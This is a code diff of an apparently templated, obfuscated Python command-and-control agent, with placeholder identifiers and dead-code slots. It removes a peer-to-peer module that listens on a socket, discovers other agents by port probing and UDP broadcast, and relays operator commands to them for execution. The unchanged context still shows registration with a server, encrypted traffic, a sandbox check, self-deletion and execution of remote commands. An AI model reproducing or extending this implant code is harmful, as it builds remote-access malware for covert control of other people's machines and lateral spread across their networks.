@@ -83,12 +83,7 @@ class {class_name}:
         self.{v_secret_key} = None  # Will be set during registration
         self.{v_fernet} = None     # Fernet instance for encryption/decryption
 
-        self.{v_p2p_enabled} = {p2p_enabled}  # Configurable P2P capability
-        self.{v_p2p_port} = {p2p_port}  # Configurable P2P port
-        self.{v_local_agents} = {{}}  # Track local agents on network
-        self.{v_p2p_server} = None
-        self.{v_p2p_discovery_timer} = None
-        self.{v_p2p_command_queue} = []  # Queue for forwarded commands
+        # P2P functionality has been removed
 
         self.{v_sandbox_enabled} = {sandbox_check_enabled}
 
@@ -822,224 +817,13 @@ class {class_name}:
             # Force exit
             os._exit(0)
 
-    def {m_setup_p2p_communication}(self):
-        if self.{v_p2p_enabled}:
-            p2p_thread = threading.Thread(target=self.{m_start_p2p_server}, daemon=True)
-            p2p_thread.start()
-            
-            discovery_thread = threading.Thread(target=self.{m_discover_local_agents}, daemon=True)
-            discovery_thread.start()
     
-    def {m_start_p2p_server}(self):
-        import socket
-        import json
-        
-        try:
-            server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-            server_socket.bind(('', self.{v_p2p_port}))
-            server_socket.listen(5)
-            self.{v_p2p_server} = server_socket
-            
-            while self.{v_running}:
-                try:
-                    client_socket, addr = server_socket.accept()
-                    client_thread = threading.Thread(
-                        target=self.{m_handle_p2p_request}, 
-                        args=(client_socket, addr),
-                        daemon=True
-                    )
-                    client_thread.start()
-                except:
-                    break
-        except Exception as e:
-            pass
 
-    def {m_stop_p2p_server}(self):
-        if self.{v_p2p_server}:
-            try:
-                self.{v_p2p_server}.close()
-            except:
-                pass
-            self.{v_p2p_server} = None
 
-    def {m_discover_local_agents}(self):
-        import socket
-        import struct
-        
-        discovery_interval = 30  # seconds
-        port_range = range(self.{v_p2p_port}-5, self.{v_p2p_port}+5)  # Look for agents on nearby ports
-        
-        while self.{v_running}:
-            try:
-                for port in port_range:
-                    if port == self.{v_p2p_port}:  # Skip own port
-                        continue
-                        
-                    test_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                    test_socket.settimeout(2)
-                    
-                    try:
-                        result = test_socket.connect_ex(('127.0.0.1', port))
-                        if result == 0:
-                            discovery_msg = {{
-                                'type': 'discovery',
-                                'agent_id': self.{v_agent_id},
-                                'hostname': self.{v_hostname},
-                                'port': self.{v_p2p_port}
-                            }}
-                            test_socket.send(json.dumps(discovery_msg).encode())
-                            
-                            response = test_socket.recv(1024)
-                            if response:
-                                try:
-                                    response_data = json.loads(response.decode())
-                                    if response_data.get('type') == 'discovery_response':
-                                        # Add to local agents
-                                        agent_addr = "127.0.0.1:" + str(port)
-                                        self.{v_local_agents}[agent_addr] = {{
-                                            'agent_id': response_data['agent_id'],
-                                            'hostname': response_data['hostname'],
-                                            'last_seen': time.time()
-                                        }}
-                                except:
-                                    pass
-                    except:
-                        pass
-                    finally:
-                        try:
-                            test_socket.close()
-                        except:
-                            pass
-                
-                self.{m_broadcast_presence}()
-                
-                time.sleep(discovery_interval)
-            except:
-                time.sleep(60)  # Wait longer on error
 
-    def {m_broadcast_presence}(self):
-        import socket
-        
-        try:
-            broadcast_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-            broadcast_socket.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
-            broadcast_socket.settimeout(2)
-            
-            discovery_msg = {{
-                'type': 'discovery',
-                'agent_id': self.{v_agent_id},
-                'hostname': self.{v_hostname},
-                'port': self.{v_p2p_port}
-            }}
-            
-            broadcast_socket.sendto(
-                json.dumps(discovery_msg).encode(), 
-                ('<broadcast>', self.{v_p2p_port})
-            )
-            
-            for offset in [1, -1, 2, -2]:
-                try:
-                    broadcast_socket.sendto(
-                        json.dumps(discovery_msg).encode(),
-                        ('<broadcast>', self.{v_p2p_port} + offset)
-                    )
-                except:
-                    pass
-                    
-            broadcast_socket.close()
-        except:
-            pass
 
-    def {m_handle_p2p_request}(self, client_socket, addr):
-        import json
-        
-        try:
-            data = client_socket.recv(4096)
-            if data:
-                try:
-                    msg = json.loads(data.decode())
-                    
-                    if msg.get('type') == 'discovery':
-                        response = {{
-                            'type': 'discovery_response',
-                            'agent_id': self.{v_agent_id},
-                            'hostname': self.{v_hostname}
-                        }}
-                        client_socket.send(json.dumps(response).encode())
-                        
-                        agent_addr = str(addr[0]) + ":" + str(addr[1])
-                        self.{v_local_agents}[agent_addr] = {{
-                            'agent_id': msg['agent_id'],
-                            'hostname': msg['hostname'],
-                            'last_seen': time.time()
-                        }}
-                        
-                    elif msg.get('type') == 'command_forward':
-                        result = self.{m_receive_forwarded_command}(msg)
-                        response = {{'result': result}}
-                        client_socket.send(json.dumps(response).encode())
-                        
-                except json.JSONDecodeError:
-                    pass
-        except:
-            pass
-        finally:
-            try:
-                client_socket.close()
-            except:
-                pass
 
-    def {m_forward_command}(self, target_agent_addr, command):
-        import json
-        import socket
-        
-        try:
-            if ':' not in target_agent_addr:
-                return "[ERROR] Invalid target address format. Expected host:port"
-            
-            addr_parts = target_agent_addr.split(':', 1)
-            if len(addr_parts) != 2:
-                return "[ERROR] Invalid target address format. Expected host:port"
-                
-            host = addr_parts[0]
-            try:
-                port = int(addr_parts[1])
-            except ValueError:
-                return "[ERROR] Invalid port number in target address"
-            
-            client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            client_socket.settimeout(10)
-            client_socket.connect((host, port))
-            
-            cmd_msg = {{
-                'type': 'command_forward',
-                'source_agent_id': self.{v_agent_id},
-                'command': command,
-                'timestamp': time.time()
-            }}
-            
-            client_socket.send(json.dumps(cmd_msg).encode())
-            
-            result_data = client_socket.recv(8192)
-            result = json.loads(result_data.decode())
-            
-            client_socket.close()
-            
-            return result.get('result', 'No result received')
-            
-        except Exception as e:
-            return f"[ERROR] Failed to forward command: {{str(e)}}"
 
-    def {m_receive_forwarded_command}(self, msg):
-        try:
-            command = msg['command']
-            
-            result = self.{m_exec}(command)
-            return result
-            
-        except Exception as e:
-            return f"[ERROR] Failed to execute forwarded command: {{str(e)}}"
 
 
     def {m_handle_upload}(self, command):
@@ -1155,36 +939,6 @@ class {class_name}:
                             result = "[ERROR] Sleep interval must be a valid integer"
                         except Exception as e:
                             result = f"[ERROR] Failed to change sleep interval: {{str(e)}}"
-                    elif command.startswith('p2p '):
-                        try:
-                            parts = command.split(' ', 2)  # Split into at most 3 parts: ['p2p', 'command', 'rest']
-                            if len(parts) < 2:
-                                result = "[ERROR] Invalid P2P command format. Usage: p2p <command> [args]"
-                            else:
-                                p2p_cmd = parts[1]
-                                if p2p_cmd == 'list':
-                                    if self.{v_local_agents}:
-                                        agent_list = []
-                                        for addr, info in self.{v_local_agents}.items():
-                                            agent_list.append("Agent: " + str(info['agent_id']) + ", Hostname: " + str(info['hostname']) + ", Addr: " + str(addr))
-                                        result = "[P2P AGENTS]\n" + "\n".join(agent_list)
-                                    else:
-                                        result = "[P2P] No agents discovered on local network"
-                                elif p2p_cmd == 'forward' and len(parts) == 3:
-                                    target_addr_parts = parts[2].split(' ', 1)
-                                    if len(target_addr_parts) >= 2:
-                                        target_addr = target_addr_parts[0]
-                                        forwarded_command = target_addr_parts[1]
-                                        result = self.{m_forward_command}(target_addr, forwarded_command)
-                                    else:
-                                        result = "[ERROR] Invalid P2P forward command format. Usage: p2p forward <target_addr> <command>"
-                                elif p2p_cmd == 'discover':
-                                    self.{m_discover_local_agents}()
-                                    result = "[P2P] Discovery initiated"
-                                else:
-                                    result = "[ERROR] Unknown P2P command: " + str(p2p_cmd) + ". Available: list, forward <addr> <command>, discover"
-                        except Exception as e:
-                            result = f"[ERROR] P2P command failed: {{str(e)}}"
                     else:
                         result = self.{m_exec}(command)
                     self.{m_submit_interactive_result}(task_id, result)
@@ -1224,7 +978,7 @@ class {class_name}:
         while not self.{m_register}():
             time.sleep(30)
             
-        self.{m_setup_p2p_communication}()
+        # P2P functionality has been removed
         
         self.{v_running} = True
         check_count = 0
@@ -1300,38 +1054,6 @@ class {class_name}:
                                     result = "[ERROR] Sleep interval must be a valid integer"
                                 except Exception as e:
                                     result = f"[ERROR] Failed to change sleep interval: {{str(e)}}"
-                            elif command.startswith('p2p '):
-                                # Handle P2P commands: p2p list, p2p forward <target> <command>, etc.
-                                try:
-                                    parts = command.split(' ', 2)  # Split into at most 3 parts: ['p2p', 'command', 'rest']
-                                    if len(parts) < 2:
-                                        result = "[ERROR] Invalid P2P command format. Usage: p2p <command> [args]"
-                                    else:
-                                        p2p_cmd = parts[1]
-                                        if p2p_cmd == 'list':
-                                            if self.{v_local_agents}:
-                                                agent_list = []
-                                                for addr, info in self.{v_local_agents}.items():
-                                                    agent_list.append("Agent: " + str(info['agent_id']) + ", Hostname: " + str(info['hostname']) + ", Addr: " + str(addr))
-                                                result = "[P2P AGENTS]\n" + "\n".join(agent_list)
-                                            else:
-                                                result = "[P2P] No agents discovered on local network"
-                                        elif p2p_cmd == 'forward' and len(parts) == 3:
-                                            target_addr_parts = parts[2].split(' ', 1)
-                                            if len(target_addr_parts) >= 2:
-                                                target_addr = target_addr_parts[0]
-                                                forwarded_command = target_addr_parts[1]
-                                                result = self.{m_forward_command}(target_addr, forwarded_command)
-                                            else:
-                                                result = "[ERROR] Invalid P2P forward command format. Usage: p2p forward <target_addr> <command>"
-                                        elif p2p_cmd == 'discover':
-                                            # Manually trigger discovery
-                                            self.{m_discover_local_agents}()
-                                            result = "[P2P] Discovery initiated"
-                                        else:
-                                            result = "[ERROR] Unknown P2P command: " + str(p2p_cmd) + ". Available: list, forward <addr> <command>, discover"
-                                except Exception as e:
-                                    result = f"[ERROR] P2P command failed: {{str(e)}}"
                             elif command.startswith('kill'):
                                 self.{m_self_delete}()
                             else:
@@ -1369,7 +1091,7 @@ class {class_name}:
     def {m_stop_agent}(self):
         self.{v_running} = False
         self.{m_exit_interactive_mode}()
-        self.{m_stop_p2p_server}()
+        # P2P functionality has been removed
         {dead_code_4}
 
 if __name__ == '__main__':
